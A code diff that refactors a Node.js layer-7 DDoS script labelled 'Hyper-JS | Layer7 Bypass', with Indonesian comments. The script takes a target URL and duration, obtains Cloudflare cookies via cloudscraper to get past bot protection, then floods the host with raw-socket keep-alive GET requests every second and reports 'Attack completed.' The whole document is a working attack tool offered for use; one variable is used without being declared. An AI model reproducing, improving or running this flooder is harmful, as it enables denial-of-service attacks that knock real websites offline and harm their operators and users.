@@ -1,18 +1,30 @@
 const EventEmitter = require('events');
+const cloudscraper = require('cloudscraper');
+const url = require('url');
+const net = require('net');
+const vm = require('vm');
+
+// Maksimal listener tidak terbatas
 const emitter = new EventEmitter();
 emitter.setMaxListeners(Number.POSITIVE_INFINITY);
 
-var cloudscraper = require('cloudscraper');
-const url = require('url');
+// Validasi argumen input
 if (process.argv.length <= 2) {
-	console.log("\x1b[0;35mHyper-JS \x1b[1;37m| \x1b[0;31mLayer7 Bypass");
-	console.log("\x1b[0;32mUsage: node hyper.js <url> <time>");
-	console.log("\x1b[1;34mExample: node hyper.js <http://example.com> <60>");
-	process.exit(-1);
+  console.log("\x1b[0;35mHyper-JS \x1b[1;37m| \x1b[0;31mLayer7 Bypass");
+  console.log("\x1b[0;32mUsage: node hyper.js <url> <time>");
+  console.log("\x1b[1;34mExample: node hyper.js <http://example.com> <60>");
+  process.exit(-1);
 }
-var target = process.argv[2];
-var time = process.argv[3];
-var cookie = "";
+
+const target = process.argv[2];
+const time = parseInt(process.argv[3], 10);
+if (isNaN(time) || time <= 0) {
+  console.error("Invalid time value. Please provide a positive integer.");
+  process.exit(1);
+}
+
+const host = url.parse(target).host;
+let cookie = '';
 var UserAgent    = [
   "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
   "Mozilla/5.0 (Linux; U; Android 4.3; en-us; ZTE-Z667G Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
@@ -2087,98 +2099,69 @@ var UserAgent    = [
     "Mozilla/5.0 (Linux; Android 4.3; SAMSUNG-SM-N900A Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; SM-G900F Build/KOT49H) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24 T5/2.0 baidubrowser/5.7.5.0 (Baidu; P1 4.4.2)",
 ];
-var host = url.parse(target).host;
+// Ambil token dari Cloudflare
 cloudscraper.get(target, function (error, response) {
-	if (error) {
-	} else {
-		var parsed = JSON.parse(JSON.stringify(response));
-		cookie = (parsed["request"]["headers"]["cookie"]);
-		if (cookie == undefined) {
-			cookie = (parsed["headers"]["set-cookie"]);
-		}
-		UserAgent = (parsed["request"]["headers"]["User-Agent"]);
-	}
-	console.log('Received tokens!')
-	console.log(cookie + '/' + UserAgent);
+  if (error) {
+    console.error("Error fetching target:", error.message);
+  } else {
+    try {
+      cookie = response.request.headers.cookie || response.headers['set-cookie']?.join('; ') || '';
+      userAgent = response.request.headers['User-Agent'] || '';
+      console.log('Received tokens!');
+      console.log(`Cookie: ${cookie}`);
+      console.log(`User-Agent: ${userAgent}`);
+    } catch (err) {
+      console.error("Error parsing response:", err.message);
+    }
+  }
 });
-var counter = 0;
 
-function setCookieAndReload(response, body, options, callback) {
-  var challenge = body.match(/S='([^']+)'/);
-  var makeRequest = requestMethod(options.method);
-
-  if (!challenge) {
-    return callback({errorType: 3, error: 'I cant extract cookie generation code from page'}, response, body);
-  }
-
-  var base64EncodedCode = challenge[1];
-  var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');
-
-  var sandbox = {
-    location: {
-      reload: function() {}
-    },
-    document: {}
-  };
-
-  vm.runInNewContext(cookieSettingCode, sandbox);
-
-  try {
-    jar.setCookie(sandbox.document.cookie, response.request.uri.href, {ignoreError: true});
-  } catch (err) {
-    return callback({errorType: 3, error: 'Error occurred during evaluation: ' +  err.message}, response, body);
-  }
-
-  options.challengesToSolve = options.challengesToSolve - 1;
-
-  makeRequest(options, function(error, response, body) {
-    processRequestResponse(options, {error: error, response: response, body: body}, callback);
+const createSocketConnection = () => {
+  const socket = new net.Socket();
+  socket.setTimeout(5000);
+  socket.connect(80, host, () => {
+    for (let i = 0; i < 25; i++) {
+      const request = `GET ${target} HTTP/1.1\r\n` +
+        `Host: ${host}\r\n` +
+        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n` +
+        `User-Agent: ${userAgent}\r\n` +
+        `Upgrade-Insecure-Requests: 1\r\n` +
+        `Cookie: ${cookie}\r\n` +
+        `Accept-Encoding: gzip, deflate\r\n` +
+        `Accept-Language: en-US,en;q=0.9\r\n` +
+        `Cache-Control: max-age=0\r\n` +
+        `Connection: Keep-Alive\r\n\r\n`;
+      socket.write(request);
+    }
   });
-}
 
-function checkForErrors(error, body) {
-  var match;
+  socket.on('data', () => {
+    setTimeout(() => socket.destroy(), 2500);
+  });
 
-  if(error) {
-    return { errorType: 0, error: error };
+  socket.on('error', (err) => {
+    console.error("Socket error:", err.message);
+    socket.destroy();
+  });
+};
+
+// Mulai interval koneksi setelah mendapatkan token
+const interval = setInterval(() => {
+  if (cookie && userAgent) {
+    createSocketConnection();
   }
+}, 1000);
 
-  if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
-    return { errorType: 1 };
-  }
+setTimeout(() => {
+  clearInterval(interval);
+  console.log("Attack completed.");
+}, time * 1000);
 
-  match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);
-
-  if (match) {
-    return { errorType: 2, error: parseInt(match[1]) };
-  }
-
-  return false;
-}
-
-var int = setInterval(() => {
-	if (cookie !== '' && UserAgent !== '') {
-		var s = require('net').Socket();
-		s.connect(80, host);
-		s.setTimeout(5000);
-		for (var i = 0; i < 25; i++) {
-			s.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + UserAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
-		}
-		s.on('data', function () {
-			setTimeout(function () {
-				s.destroy();
-				return delete s;
-			}, 2500);
-		})
-	}
-});
-setTimeout(() => clearInterval(int), time * 1000);
-
-// to not crash on errors
-process.on('uncaughtException', function (err) {
-	console.log(err);
+// Tangani error agar tidak crash
+process.on('uncaughtException', (err) => {
+  console.error("Uncaught exception:", err);
 });
 
-process.on('unhandledRejection', function (err) {
-	console.log(err);
+process.on('unhandledRejection', (reason) => {
+  console.error("Unhandled rejection:", reason);
 });
